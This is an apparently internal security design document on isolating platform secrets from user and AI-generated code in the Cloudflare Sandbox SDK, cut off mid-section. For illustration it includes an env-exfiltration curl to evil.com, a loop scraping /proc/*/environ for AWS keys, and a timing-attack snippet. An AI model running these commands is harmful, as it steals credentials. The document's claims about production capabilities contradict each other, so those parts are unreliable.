# Environment Variables Security Isolation Analysis

## Executive Summary

The Cloudflare Sandbox SDK currently has a critical security vulnerability where platform-level secrets (API keys, database credentials, etc.) set via `setEnvVars()` are accessible to all user code running in the sandbox. This document analyzes the vulnerability, explores solutions, and recommends a phased approach to fix it.

**Key Finding**: Any environment variable set through `setEnvVars()` becomes accessible to ALL code executed in the container, including user-generated code, AI-generated code, and third-party dependencies.

**Critical Insight**: We control the container's bun server (control plane), which opens up powerful mitigation strategies like in-memory credential vaults and isolated execution contexts.

**Recommended Solution**: Production environments already have the necessary Linux capabilities (CAP_SYS_ADMIN) to implement complete isolation. We can build namespace-based isolation today without waiting for platform changes.

## Problem Statement

### Context
The Cloudflare Sandbox SDK enables developers to create platforms where end users can execute code in isolated environments. A common use case is AI-powered development platforms where users prompt AI agents to generate and run applications.

### The Two-Persona Challenge

#### Persona 1: Platform Developer
- Building a service using the Sandbox SDK
- Needs to provide secrets/credentials for platform functionality
- Examples of required secrets:
  - Cloudflare R2 keys for template storage
  - Database credentials for platform data
  - API keys for third-party services
  - Authentication tokens for internal services

#### Persona 2: End User
- Using the platform to generate/run code via AI agents
- Has implicit remote code execution within the sandbox
- Should NOT have access to platform-level secrets
- May legitimately need their own environment variables

### The Security Gap

When using `setEnvVars()` method:
```typescript
await sandbox.setEnvVars({
  CLOUDFLARE_R2_KEY: "secret-key",    // Platform secret
  DATABASE_URL: "postgresql://...",    // Platform secret
  API_KEY: "platform-api-key"         // Platform secret
});
```

These variables become accessible to ALL code running in the container, including:
- User-generated code
- AI-generated code on behalf of the user
- Any process spawned within the sandbox

Attack vector example:
```javascript
// User asks AI: "Create an app that shows system information"
// AI generates (innocently or maliciously):
console.log(process.env);  // Exposes ALL environment variables
```

## Deep Dive: Why This Matters

### Real-World Scenarios

1. **Template Management Platform**
   - Platform stores application templates in R2
   - Needs R2 credentials to fetch templates for users
   - User code shouldn't access R2 directly

2. **Database-Backed Development Environment**
   - Platform tracks user projects, saves states
   - Needs database credentials for platform operations
   - User code shouldn't have direct database access

3. **API Gateway Services**
   - Platform provides managed API access
   - Uses API keys for rate limiting, billing
   - User code should go through platform's API layer, not direct access

4. **AWS Deployment Platform** (Critical Use Case)
   - AI generates Lambda functions or infrastructure code
   - Code needs to be packaged and deployed to AWS
   - AWS CLI must run INSIDE container (where files are)
   - AWS CLI requires credentials via env vars or ~/.aws/credentials
   - Cannot modify how AWS CLI works

5. **Database Migration Platform**
   - Platform needs to run migrations through bastion hosts
   - SSH tunnels and database tools need credentials
   - Migration scripts run in container with database access
   - Tools expect standard credential formats

### Trust Boundaries

```
┌─────────────────────────────────────┐
│         Platform Layer              │
│  (Trusted - Has access to secrets)  │
├─────────────────────────────────────┤
│         Sandbox Runtime             │
│  (Semi-trusted - Controlled env)    │
├─────────────────────────────────────┤
│         User Code Layer            │
│  (Untrusted - Should be isolated)   │
└─────────────────────────────────────┘
```

Current issue: No boundary between Platform Layer and User Code Layer within the sandbox.

## Threat Model

### Direct Attacks
1. **Intentional Exfiltration**: User explicitly tries to steal secrets
2. **Social Engineering**: User tricks AI into revealing secrets
3. **Prompt Injection**: Crafted prompts that make AI expose environment

### Indirect Risks
1. **Accidental Exposure**: Legitimate debugging code that logs environment
2. **Dependency Vulnerabilities**: Third-party packages that collect env vars
3. **Error Messages**: Stack traces that include environment context
4. **AI Hallucination**: AI mistakenly includes env vars in generated code

## Technical Constraints

### Current SDK Limitations
1. `setEnvVars()` must be called immediately after `getSandbox()`
2. Environment variables cannot be changed once sandbox starts
3. All processes in the container share the same environment
4. No native secret management or isolation mechanism

### Container Environment
- Single container instance per sandbox
- All processes share the same Linux namespace
- Environment variables are process-wide, inherited by children
- **We control the bun server** at `/container_src/index.ts` that handles all operations
- The bun server acts as our control plane between Worker/DO and user code

### Tool Integration Reality
- **Third-party tools (AWS CLI, gcloud, terraform, etc.) cannot be modified**
- These tools expect credentials in standard locations:
  - Environment variables (AWS_ACCESS_KEY_ID, GOOGLE_APPLICATION_CREDENTIALS)
  - Config files (~/.aws/credentials, ~/.config/gcloud)
  - Cannot be instructed to use custom credential providers
- **Container code is arbitrary** - any language, any framework
- **AI models don't know about platform-specific patterns**
- **Everything runs in the same process namespace**

## Requirements for a Solution

### Must Have
1. **Secret Isolation**: Platform secrets NEVER accessible to user code
2. **Platform Functionality**: Platform code can still access required secrets
3. **Backward Compatibility**: Existing SDK usage shouldn't break
4. **Developer Experience**: Simple, intuitive API for developers
5. **Security by Default**: Hard to accidentally expose secrets

### Nice to Have
1. **Granular Permissions**: Different secrets for different operations
2. **Audit Trail**: Log secret access attempts
3. **Rotation Support**: Change secrets without restarting sandbox
4. **User Variables**: Safe way for users to provide their own env vars
5. **Multiple Security Contexts**: Different trust levels within same sandbox

## Potential Attack Surfaces to Consider

### Code Execution Paths
- Direct `exec()` commands
- Process spawning via `startProcess()`
- Code interpreter (Python/JavaScript contexts)
- Git operations that might execute hooks
- Package installation scripts (npm install, pip install)
- Build processes that might read environment

### Information Leakage Vectors
- Standard output/error streams
- File system (writing env to files)
- Network requests (sending env to external services)
- Process inspection (/proc filesystem)
- Shell expansion and interpolation
- Debugging interfaces


## Success Criteria

A successful solution should:
1. Completely prevent user code from accessing platform secrets
2. Maintain full platform functionality
3. Be transparent to end users
4. Be easy for developers to implement correctly
5. Fail securely (deny by default)
6. Support common use cases without complexity
7. Not significantly impact performance

## Current Implementation Analysis

### How `setEnvVars()` Works Today

1. **Setting Environment Variables** (`sandbox.ts:86-89`):
```typescript
async setEnvVars(envVars: Record<string, string>): Promise<void> {
  this.envVars = { ...this.envVars, ...envVars };
  console.log(`[Sandbox] Updated environment variables`);
}
```

2. **Command Execution** (`container_src/handler/exec.ts:20`):
```typescript
env: options.env ? { ...process.env, ...options.env } : process.env
```

3. **Process Spawning** (`container_src/handler/process.ts:76`):
```typescript
env: { ...process.env, ...options.env }
```

### The Security Vulnerability

When `setEnvVars()` is called, the provided variables become part of the container's `process.env`. These are then:
1. Inherited by ALL spawned processes via Node.js `spawn()`
2. Accessible to any code running in the container
3. Available through multiple execution paths:
   - `exec()` commands
   - `startProcess()` background processes
   - Code interpreter sessions (Python/JavaScript)
   - Git operations that might run hooks
   - Package installation scripts

### Attack Demonstration

```typescript
// Platform developer sets secrets
await sandbox.setEnvVars({
  CLOUDFLARE_R2_KEY: "secret-r2-key",
  DATABASE_URL: "postgresql://user:pass@host/db"
});

// User/AI can now access these secrets
await sandbox.exec("echo $CLOUDFLARE_R2_KEY");  // Outputs: secret-r2-key
await sandbox.runCode("import os; print(os.environ)", { language: 'python' });  // Shows all env vars
await sandbox.exec("node -e 'console.log(process.env)'");  // Full environment dump
```

### Architecture Flow

```
Worker (Platform Layer)
    ↓ setEnvVars()
Durable Object (Sandbox)
    ↓ stores in this.envVars
Container (Execution Layer)
    ↓ merges with process.env
Spawned Processes (User Code)
    ↓ inherits full environment
All Code Has Access ⚠️
```

### Why This is Critical

1. **No Isolation Boundary**: The same environment variables are shared across all trust levels
2. **Ambient Authority**: Secrets are available ambiently - code doesn't need to explicitly request them
3. **Multiple Access Vectors**: Many ways to access environment (direct, indirect, accidental)
4. **Persistent Exposure**: Once set, secrets remain accessible for the container's lifetime
5. **No Audit Trail**: No way to track or control which code accesses secrets

## Design Considerations

### Cloudflare Platform Capabilities

1. **Worker ↔ Durable Object Boundary**:
   - Workers can make RPC calls to Durable Objects
   - Could potentially act as a security boundary
   - Platform operations could stay in Worker layer

2. **Container Isolation**:
   - Containers run in isolated environments
   - But no sub-process isolation within a container
   - All processes share the same Linux namespace

3. **RPC Communication**:
   - All sandbox methods are RPC calls
   - Could introduce proxy methods for privileged operations
   - Authentication/authorization could be added at RPC layer


## Our Leverage: Container Control

### What We Control
We have significant leverage through our bun server that runs as the container's control plane:

1. **The base Docker image** - We provide the foundation all developers build on
2. **The bun server** (`/container_src/index.ts`) - Mediates ALL operations:
   - Command execution (`/api/execute`)
   - File operations (`/api/write`, `/api/read`)
   - Process management (`/api/process/*`)
   - Port forwarding (`/api/expose-port`)
3. **The communication channel** - All Worker↔Container communication goes through our server

### Solutions We Can Build Today

#### In-Memory Credential Vault
```typescript
// In our bun server - credentials never touch process.env
class CredentialVault {
  private secrets = new Map<string, string>();
  private accessLog: AccessRecord[] = [];
  
  // Store credentials encrypted in memory
  store(creds: Record<string, string>) {
    for (const [key, value] of Object.entries(creds)) {
      this.secrets.set(key, encrypt(value));
    }
  }
  
  // Execute with just-in-time injection
  async execWithCreds(command: string, credKeys: string[], timeout: number) {
    const creds = {};
    credKeys.forEach(key => {
      creds[key] = decrypt(this.secrets.get(key));
    });
    
    // THE CRITICAL MOMENT - credentials briefly visible
    const proc = spawn(command, {
      env: { ...process.env, ...creds },
      timeout
    });
    
    // Log access for audit
    this.accessLog.push({ command, credKeys, timestamp: Date.now() });
    
    return await collectOutput(proc);
  }
}
```

**Pros:**
- Credentials never in global environment
- Audit trail of all credential access
- Can rotate credentials without restart
- Scoped access per operation

**Cons:**
- Still exposed during execution in `/proc/[pid]/environ`
- User code could read memory via `/proc/[bun-pid]/mem`
- Child processes inherit credentials
- Vulnerable to timing attacks

## Alternative Approaches Considered

### 1. LD_PRELOAD Injection
```c
// Intercept getenv() calls at libc level
char* getenv(const char* name) {
  if (is_credential(name) && !is_authorized_process()) {
    return NULL;
  }
  return original_getenv(name);
}
```
**Verdict:** Complex, can be bypassed by static linking

### 2. FUSE Virtual Filesystem
```typescript
// Mount virtual ~/.aws/credentials that checks caller
fuseMount('~/.aws/credentials', {
  read: (pid) => isAuthorized(pid) ? getCredentials() : ""
});
```
**Verdict:** Requires privileges we don't have

### 3. Sidecar Credential Service
```typescript
// Separate process holds credentials, accessed via socket
const creds = await fetch('http://unix:/tmp/creds.sock/aws-key');
```
**Verdict:** Requires wrapping every CLI tool

### 4. Time-Based Credential Files
```typescript
// Write credentials with immediate deletion
await writeFile(credFile, creds, { mode: 0o600 });
setTimeout(() => unlink(credFile), 100); // Delete after 100ms
```
**Verdict:** Race conditions, still readable briefly




## Migration Path

1. **Deprecation Warning**: Add warning to `setEnvVars()` when used with sensitive-looking keys
2. **New Methods**: Introduce `setPlatformSecrets()` and `setUserEnvVars()`
3. **Documentation**: Update all examples to use secure patterns
4. **Compatibility Mode**: Support both patterns during transition
5. **Breaking Change**: Eventually remove ability to set secrets via `setEnvVars()`

## Security Checklist

Before implementing, ensure:
- [ ] Secrets never accessible to user code
- [ ] Platform operations are authenticated/authorized
- [ ] Audit logging for all secret access attempts
- [ ] Clear documentation of security boundaries
- [ ] Secure by default - hard to misuse
- [ ] Performance impact is acceptable
- [ ] Migration path for existing users

## Edge Cases & Additional Considerations

### Complex Attack Vectors

#### 1. Transitive Dependencies
```javascript
// User installs a package that reads env vars
await sandbox.exec('npm install some-package');
// Package's postinstall script could access secrets
```

**Mitigation**: Run package installations in restricted environment

#### 2. File System Persistence
```javascript
// User writes secrets to file
await sandbox.exec('env > /tmp/secrets.txt');
// Later reads them back
await sandbox.readFile('/tmp/secrets.txt');
```

**Mitigation**: File system isolation or periodic cleanup

#### 3. Network Exfiltration
```javascript
// User sends secrets to external server
await sandbox.exec('curl https://evil.com -d "$(env)"');
```

**Mitigation**: Network egress filtering, allowlisting

#### 4. Timing Attacks
```javascript
// User infers secret length/content through timing
for (let i = 0; i < 100; i++) {
  const start = Date.now();
  await sandbox.exec(`if [ "$SECRET" = "${guess}" ]; then sleep 1; fi`);
  const timing = Date.now() - start;
  // Analyze timing...
}
```

**Mitigation**: Rate limiting, execution quotas

### Platform Use Cases to Support

#### 1. Template Fetching from R2
```typescript
// Platform needs R2 credentials to fetch templates
// User shouldn't access R2 directly
interface TemplateService {
  fetchTemplate(id: string): Promise<Buffer>;
  listTemplates(): Promise<Template[]>;
}
```

#### 2. Database Operations
```typescript
// Platform tracks usage, stores metadata
// User shouldn't have direct DB access
interface MetadataService {
  saveProject(data: ProjectData): Promise<void>;
  getUsage(userId: string): Promise<Usage>;
}
```

#### 3. External API Integration
```typescript
// Platform uses API keys for services
// User gets proxied/limited access
interface AIService {
  complete(prompt: string, model: string): Promise<Response>;
  // Rate limited, usage tracked per user
}
```

### Performance Implications

#### Latency Analysis
- **Current**: Direct env var access (~0ms)
- **Proxy Pattern**: RPC round trip (~5-10ms per operation)
- **Secret Service**: Network request (~20-50ms per secret fetch)
- **Platform SDK**: API call (~30-100ms depending on operation)

#### Optimization Strategies
1. **Batching**: Group platform operations
2. **Caching**: Cache non-sensitive results
3. **Preloading**: Anticipate needed operations
4. **Async Operations**: Non-blocking where possible

### Backward Compatibility Strategy

#### Phase 1: Detection & Warning (Non-breaking)
```typescript
async setEnvVars(vars: Record<string, string>) {
  const sensitiveKeys = Object.keys(vars).filter(k => 
    k.includes('KEY') || k.includes('SECRET') || 
    k.includes('TOKEN') || k.includes('PASSWORD')
  );
  
  if (sensitiveKeys.length > 0) {
    console.warn(
      '[SECURITY WARNING] Setting potentially sensitive environment variables. ' +
      'Consider using setPlatformSecrets() or platform operations instead. ' +
      'See: https://docs.example.com/security'
    );
  }
  
  // Continue with current behavior
  this.envVars = { ...this.envVars, ...vars };
}
```

#### Phase 2: Opt-in Security (Breaking for opt-in users)
```typescript
interface SandboxOptions {
  secureMode?: boolean; // Default false for compatibility
}

async setEnvVars(vars: Record<string, string>) {
  if (this.options.secureMode) {
    throw new Error(
      'setEnvVars() is disabled in secure mode. ' +
      'Use setUserEnvVars() for non-secrets or platform operations for secrets.'
    );
  }
  // Legacy behavior
}
```

#### Phase 3: Secure by Default (Breaking change)
```typescript
// Remove setEnvVars() entirely
// Only allow:
async setUserEnvVars(vars: Record<string, string>) {
  // Validate no sensitive-looking keys
  // Set only in user context
}

async setPlatformConfig(config: PlatformConfig) {
  // Platform-specific configuration
  // Not accessible to user code
}
```

### Testing Strategy

#### Security Test Suite
```typescript
describe('Environment Variable Security', () => {
  test('User code cannot access platform secrets', async () => {
    await sandbox.setPlatformSecrets({ API_KEY: 'secret' });
    const result = await sandbox.exec('echo $API_KEY');
    expect(result.stdout).not.toContain('secret');
  });
  
  test('Platform operations can use secrets', async () => {
    await sandbox.setPlatformSecrets({ R2_KEY: 'secret' });
    const result = await sandbox.platformExec('fetch-template', { id: 'test' });
    expect(result.success).toBe(true);
  });
  
  test('Transitive access is blocked', async () => {
    await sandbox.setPlatformSecrets({ SECRET: 'value' });
    await sandbox.exec('npm install malicious-package');
    // Verify postinstall scripts didn't access SECRET
  });
});
```

### Documentation Requirements

#### Security Guide
- Clear explanation of the security model
- Examples of secure vs insecure patterns
- Migration guide from old to new API
- Common pitfalls and how to avoid them

#### API Reference
- Detailed documentation of each method
- Security implications clearly marked
- Code examples for each use case
- Performance characteristics

### Monitoring & Compliance

#### Audit Events to Track
1. Secret setting operations
2. Platform operation invocations
3. Failed access attempts
4. Suspicious patterns (rapid env queries)

#### Metrics to Monitor
- Platform operation latency
- Secret access frequency
- Security warning occurrences
- Migration adoption rate


## Real-World Tool Integration Challenge

### The Fundamental Problem

Many platform operations require third-party CLI tools that:
1. **Must run inside the container** (where the files and code are)
2. **Need real credentials** to function
3. **Cannot be modified** to use custom auth mechanisms
4. **Read credentials from standard locations** (env vars or config files)

### Example: AWS Deployment Workflow

```typescript
// What platforms need to do:
// 1. AI generates Lambda function code
await sandbox.writeFile('/app/lambda.js', aiGeneratedCode);

// 2. Package the code (must happen in container)
await sandbox.exec('zip function.zip lambda.js node_modules/**');

// 3. Deploy to AWS (needs AWS CLI with credentials)
await sandbox.exec('aws lambda update-function-code --function-name my-func --zip-file fileb://function.zip');
// ⚠️ AWS CLI needs AWS_ACCESS_KEY_ID in environment!

// 4. Run database migrations through bastion
await sandbox.exec('aws ssm start-session --target i-bastion --document AWS-StartPortForwardingSession');
await sandbox.exec('npm run db:migrate');
// ⚠️ Both commands need AWS credentials!
```

### Why Current Solutions Fall Short

| Solution | Why It Doesn't Work for CLI Tools |
|----------|------------------------------------|
| **Platform Proxy** | Can't proxy AWS CLI - it needs creds in container |
| **Worker Orchestration** | Can't use AWS CLI from Worker - files are in container |
| **Temporary Credentials** | Still exposed to user code during operation |
| **Capability Tokens** | AWS CLI doesn't understand our tokens |
| **SDK Pattern** | Can't rewrite every CLI tool |

## Practical Workarounds (Current State)

### 1. Hybrid Orchestration (Partial Security)
```typescript
// Do what you can in Worker, accept risks for what you can't
class PlatformDeployer {
  async deployToAWS(sandbox: Sandbox, userId: string) {
    // Safe: Package in container without secrets
    await sandbox.exec('zip function.zip *.js');
    
    // Safe: Pull package to Worker
    const pkg = await sandbox.readFile('/app/function.zip');
    
    // Safe: Deploy from Worker using SDK
    const lambda = new AWS.Lambda({
      credentials: this.awsCredentials
    });
    await lambda.updateFunctionCode({
      FunctionName: 'my-func',
      ZipFile: pkg.content
    }).promise();
    
    // RISKY: When CLI is unavoidable, use minimal scoped temp creds
    const tempCreds = await this.createScopedTempCredentials({
      duration: 300, // 5 minutes
      permissions: ['s3:GetObject'],
      resources: ['arn:aws:s3:::templates/*']
    });
    
    await sandbox.setEnvVars(tempCreds);
    await sandbox.exec('aws s3 cp s3://templates/base.yaml .');
    // ⚠️ Credentials exposed for 5 minutes
  }
}
```

### 2. Tooling Wrapper Scripts (Defense in Depth)
```typescript
// Create wrapper scripts that limit credential exposure
await sandbox.writeFile('/app/deploy.sh', `
#!/bin/bash
set -e
# Clear history
export HISTFILE=/dev/null
# Run operation
aws lambda update-function-code "$@"
# Immediately clear credentials
unset AWS_ACCESS_KEY_ID
unset AWS_SECRET_ACCESS_KEY
exit $?
`);

await sandbox.exec('chmod +x deploy.sh');
await sandbox.exec('./deploy.sh --function-name my-func --zip-file fileb://function.zip');
```

### 3. Separate Deployment Service (Most Secure)
```typescript
// Don't deploy from sandbox at all - use separate service
class DeploymentService {
  async deploy(sandbox: Sandbox, userId: string) {
    // Package in sandbox
    await sandbox.exec('npm run build');
    await sandbox.exec('zip -r package.zip dist/');
    
    // Upload to staging area
    const pkg = await sandbox.readFile('/app/package.zip');
    const stagingUrl = await this.uploadToStaging(pkg.content);
    
    // Trigger deployment service (runs outside sandbox)
    await fetch('https://deploy-service.internal/deploy', {
      method: 'POST',
      body: JSON.stringify({
        userId,
        packageUrl: stagingUrl,
        target: 'production'
      }),
      headers: {
        'Authorization': `Bearer ${this.deployServiceToken}`
      }
    });
  }
}
```

## Recommendations Summary

### Immediate (Today)
1. **Document the limitation clearly** - CLI tools need real credentials
2. **Provide secure patterns** for common operations
3. **Warn developers** about the security trade-offs

### Short Term (1-2 weeks)
1. Create **tool-specific wrappers** that minimize exposure
2. Implement **credential rotation** for temporary access
3. Build **allowlist of safe CLI operations**

### Medium Term (1-2 months)
1. Develop **separate deployment service** pattern
2. Create **SDK alternatives** for common CLI operations
3. Implement **audit logging** for all credential usage

### Long Term (3-6 months)
1. Work with Cloudflare to add **process-level isolation**
2. Investigate **kernel namespaces** for credential isolation
3. Build **credential proxy daemon** that mediates access

## Platform Research Findings

### Key Discoveries from Cloudflare Architecture

#### 1. Container Class Architecture
The `@cloudflare/containers` package provides:
- Base `Container` class that extends `DurableObject`
- Automatic container lifecycle management
- Built-in environment variable support via `envVars` property
- Container runs in separate process, all env vars inherited

#### 2. RPC Capabilities
**Critical Finding**: Cloudflare RPC supports passing **functions as parameters**!
- Functions can be passed from Worker to Durable Object
- The DO can call back to the Worker through these functions
- This enables true bidirectional communication
- RpcTarget class enables returning objects with methods

#### 3. Communication Patterns
- **E-order semantics**: Calls to same DO are guaranteed ordered
- **Promise pipelining**: Can chain calls without awaits for efficiency
- **Stub management**: Each stub maintains its own connection
- **Functions as callbacks**: DO can invoke Worker functions passed as params

### Architectural Implications for Our Solution

#### Perfect Fit: Platform Operations Proxy
The RPC callback capability makes our recommended solution viable:

```typescript
// Worker - holds secrets
class PlatformWorker {
  async fetch(request, env) {
    const sandbox = getSandbox(env.Sandbox, "user-sandbox");
    
    // Pass a callback function to the DO!
    await sandbox.registerPlatformCallback(async (operation, params) => {
      // This runs in the Worker, with access to secrets!
      switch(operation) {
        case 'fetch-template':
          return await env.R2.get(`templates/${params.id}`);
        case 'db-query':
          return await env.DB.prepare(params.query).run();
      }
    });
    
    // User code runs without access to secrets
    await sandbox.exec("npm start");
  }
}

// Durable Object - no secrets
class SecureSandbox extends Container {
  private platformCallback?: Function;
  
  async registerPlatformCallback(callback: Function) {
    this.platformCallback = callback;
  }
  
  async executePlatformOp(op: string, params: any) {
    if (!this.platformCallback) {
      throw new Error("No platform callback registered");
    }
    // Call back to the Worker!
    return await this.platformCallback(op, params);
  }
}
```

### Container Environment Variables Flow

```
Worker.setEnvVars() 
  → Sandbox.envVars (DO property)
  → Container.envVars (inherited from DO)
  → process.env (in container)
  → All spawned processes inherit
```

The Container class directly sets environment variables that become part of `process.env`, making isolation within the container impossible without modifying the container implementation.

### Why Other Approaches Won't Work

1. **Dual Contexts Within Container**: Would require modifying container handler code
2. **Secret Service**: Still exposes secrets temporarily in container env
3. **Capability-Based**: Would need container changes for enforcement

### Performance Considerations

- RPC round-trip: ~5-10ms (acceptable for platform operations)
- Function callbacks add minimal overhead
- Can batch operations to reduce round trips
- Promise pipelining can optimize sequential calls


## What We Can Build in the SDK

Leveraging our control of the bun server, we can implement:

### 1. Secure Execution API
```typescript
// New SDK methods that use our container control
interface SecureSandbox extends Sandbox {
  // Register credentials with container vault (never in env)
  async registerCredentials(creds: Record<string, string>): Promise<void>;
  
  // Execute with just-in-time credential injection
  async execSecure(command: string, options: {
    credentials: string[],  // Which credentials to inject
    timeout: number,        // Max execution time
    isolated?: boolean      // Hide from process list
  }): Promise<ExecResult>;
}

// Implementation in bun server
app.post('/api/secure/exec', async (req) => {
  const { command, credentials, timeout } = req.body;
  
  // Get from vault, not env
  const creds = vault.getCredentials(credentials);
  
  // Create isolated process
  const proc = spawn(command, {
    env: { ...cleanEnv, ...creds },
    detached: true,  // Separate process group
    timeout
  });
  
  // Hide from user's process list
  hiddenProcesses.add(proc.pid);
  
  return collectOutput(proc);
});
```

### 2. Credential Vault in Container
```typescript
// New endpoint in container_src/index.ts
case "/api/vault/store":
  // Store encrypted in memory, never in env
  credentialVault.store(await req.json());
  break;

case "/api/vault/exec":
  // Execute with vaulted credentials
  const { command, credKeys, timeout } = await req.json();
  return await credentialVault.execWithCreds(command, credKeys, timeout);
```

### 3. Process Isolation Techniques
```typescript
// Hide platform processes from user code
case "/api/process/list":
  // Filter out hidden platform processes
  const userProcesses = processes.filter(p => !hiddenProcesses.has(p.pid));
  return Response.json({ processes: userProcesses });
```

## Production Environment Capabilities Testing

### Testing Methodology
We deployed a comprehensive security testing worker to both local and production environments to determine actual Linux capabilities available in Cloudflare Containers.

### Test Results Summary

| Feature | Local Environment | Production Environment | Impact |
|---------|------------------|------------------------|--------|
| **CAP_SYS_ADMIN** | ❌ Not Available | ✅ **Available** | Can create namespaces for isolation |
| **PID Namespace** | ❌ Not Available | ✅ **Available** | Can hide processes from user code |
| **Mount Namespace** | ❌ Not Available | ✅ **Available** | Can isolate filesystems |
| **Network Namespace** | ❌ Not Available | ✅ **Available** | Can isolate network access |
| **User Namespace** | ❌ Not Available | ✅ **Available** | Can map different user permissions |
| **Cgroup Delegation** | ❌ Not Available | ✅ **Available** | Can create isolated resource groups |
| **CAP_SYS_PTRACE** | ❌ Not Available | ✅ **Available** | Can debug and trace processes |
| **Seccomp Mode** | 2 (Filtered) | 0 (Disabled) | No syscall filtering in production |
| **Environment Exposure** | ⚠️ Exposed | ⚠️ Exposed | Current implementation exposes all secrets |

### Production Capabilities (Raw Output)
```
CapInh: 000001ffffffffff
CapPrm: 000001ffffffffff
CapEff: 000001ffffffffff
CapBnd: 000001ffffffffff
CapAmb: 0000000000000000
```

### Key Discovery
Production containers have **full Linux capabilities** (`000001ffffffffff`), including CAP_SYS_ADMIN. This means we can implement complete namespace-based isolation TODAY without waiting for platform changes. The local development environment intentionally restricts capabilities for safety.

### Verified Attack Vectors
Testing confirmed that with the current SDK implementation:
- Environment variables set via `setEnvVars()` are accessible to all code
- Any process can read other processes' `/proc/[pid]/environ`
- Python and Node.js subprocesses inherit all environment variables
- Cross-process credential theft is trivial

## What We Can Build Today (With Production Capabilities)

### Understanding the Architecture Layers

```
┌─────────────────────────────────────┐
│         Your Worker Code            │ <- You control (your code)
├─────────────────────────────────────┤
│         Durable Object              │ <- You control (extends Container class)
├─────────────────────────────────────┤
│      Docker Container               │ <- You control (Dockerfile)
│   ┌──────────────────────┐          │
│   │   Ubuntu 22.04       │          │
│   │   + Your bun server  │          │
│   │   + AI agent         │          │
│   │   + User code        │          │
│   └──────────────────────┘          │
├─────────────────────────────────────┤
│      Container Runtime              │ <- CLOUDFLARE CONTROLS (gVisor/Firecracker)
│   (Security policies, capabilities) │    This is where we need changes!
├─────────────────────────────────────┤
│              VM (KVM)               │ <- Cloudflare controls
├─────────────────────────────────────┤
│         Physical Server             │ <- Cloudflare controls
└─────────────────────────────────────┘
```

### The Fundamental Limitation

Even though we control the Dockerfile and can install any software, **Cloudflare's container runtime restricts what our container can actually do**. We're effectively "root" but without dangerous capabilities:

```bash
# Inside our container today:
$ whoami
root  # We appear to be root

$ capsh --print
Current capabilities:  # But we're missing critical ones!
Bounding set = cap_chown,cap_net_bind_service,...
# MISSING: cap_sys_admin, cap_sys_ptrace, cap_sys_module

# This means we CAN'T do:
$ unshare --pid --fork  # Create new namespace
unshare: unshare failed: Operation not permitted  # ❌ No CAP_SYS_ADMIN!

# ANY process can still steal credentials:
for pid in /proc/*/; do
  cat $pid/environ | grep AWS_ACCESS_KEY  # Works! User code can see AI agent's env
done
```

### Platform Enhancements Needed (Priority Order)

#### 1. CAP_SYS_ADMIN - "The Namespace Creator"

**What it is:** A Linux capability that allows creating isolated namespaces (like containers within containers).

**In Simple Terms:** Think of it like creating separate universes within your container:
```
Current Reality (No CAP_SYS_ADMIN):
Container = One big shared room
├── AI Agent (has AWS credentials in env)
├── User Code (can see AI Agent's env)
└── AWS CLI (needs credentials from env)
Everyone sees everything! 🚨

With CAP_SYS_ADMIN:
Container = Multiple isolated rooms
├── Room 1: AI Agent + AWS CLI
│   ├── Has AWS credentials
│   └── Invisible to Room 2
└── Room 2: User Code
    ├── Cannot see Room 1's env
    └── Cannot even detect Room 1 exists
```

**Technical Details:**
```c
// What CAP_SYS_ADMIN enables:
unshare(CLONE_NEWPID | CLONE_NEWNS | CLONE_NEWNET);
// Creates new:
// - PID namespace (process isolation)
// - Mount namespace (filesystem isolation)  
// - Network namespace (network isolation)
```

**Real-World Example:**
```typescript
// In our bun server (if we had CAP_SYS_ADMIN):
async function runAIAgentSecurely() {
  const { pid } = fork();
  if (pid === 0) {
    // Create isolated namespace
    unshare(CLONE_NEWPID | CLONE_NEWNS);
    
    // Only THIS namespace has AWS credentials
    process.env.AWS_ACCESS_KEY_ID = vault.getSecret('aws_key');
    process.env.AWS_SECRET_ACCESS_KEY = vault.getSecret('aws_secret');
    
    // Run AI agent - it can use AWS CLI
    exec('python3 ai_agent.py');
    // AI agent can run: os.system('aws lambda deploy')
  }
  
  // User code in parent namespace CANNOT:
  // - See the AI agent process
  // - Read its environment variables
  // - Access AWS credentials
}
```

**Why We Need It:** Without CAP_SYS_ADMIN, we cannot create isolated execution contexts. All processes share the same namespace and can see each other's environment variables.

#### 2. Seccomp Filters - "The System Call Police"

**What it is:** A Linux security feature that filters system calls, blocking dangerous operations.

**In Simple Terms:** Like a bouncer that checks every request to the Linux kernel:
```
Current Reality (Default Seccomp):
User Code: "Show me process 1234's environment variables"
Linux Kernel: "Sure, here's AWS_ACCESS_KEY_ID=secret123"
User Code: "Thanks!" *steals credentials* 😈

With Custom Seccomp Filters:
User Code: "Show me process 1234's environment variables"
Seccomp Filter: "Is process 1234 yours?"
User Code: "No, it's the AI agent's process"
Seccomp Filter: "ACCESS DENIED" 🚫
```

**Technical Details:**
```c
// Custom seccomp filter we need:
struct sock_filter filter[] = {
  // Check if syscall is 'open'
  BPF_STMT(BPF_LD+BPF_W+BPF_ABS, offsetof(struct seccomp_data, nr)),
  BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, __NR_open, 0, 1),
  
  // Check if opening /proc/*/environ
  // Block if not the process's own environ
  BPF_STMT(BPF_LD+BPF_W+BPF_ABS, offsetof(struct seccomp_data, args[0])),
  // Custom logic to check PID ownership
  
  // Allow or deny
  BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),
};
```

**Real-World Example:**
```typescript
// What we could do with custom seccomp:
const seccompRules = {
  allow: [
    'read',      // Can read files
    'write',     // Can write files
    'execve',    // Can run programs
  ],
  custom: [
    {
      syscall: 'open',
      rule: (path, pid) => {
        // Block reading other processes' environ
        if (path.match(/\/proc\/(\d+)\/environ/)) {
          const targetPid = RegExp.$1;
          return targetPid === pid;  // Only allow reading own environ
        }
        return true;
      }
    }
  ],
  block: [
    'ptrace',    // Cannot debug other processes
    'process_vm_readv',  // Cannot read other process memory
  ]
};
```

**Why We Need It:** Default seccomp profiles allow reading `/proc/*/environ`, enabling credential theft. We need custom filters to block cross-process environment access.

#### 3. cgroups v2 Delegation - "The Resource Manager"

**What it is:** Linux control groups v2 with delegation allows creating sub-groups with different permissions and visibility.

**In Simple Terms:** Like creating different security zones in an office building:
```
Current Reality (No cgroup delegation):
Container = Open office floor
├── Everyone can see everyone
├── Shared resources
└── No privacy

With cgroups v2 Delegation:
Container = Secure office building
├── Executive Floor (platform cgroup)
│   ├── AI Agent + AWS CLI
│   ├── Has keycard to vault (credentials)
│   └── Surveillance cameras can't see here
└── Public Floor (user cgroup)
    ├── User code runs here
    ├── No vault access
    └── Cannot access executive floor
```

**Technical Details:**
```bash
# With cgroup v2 delegation, we could:
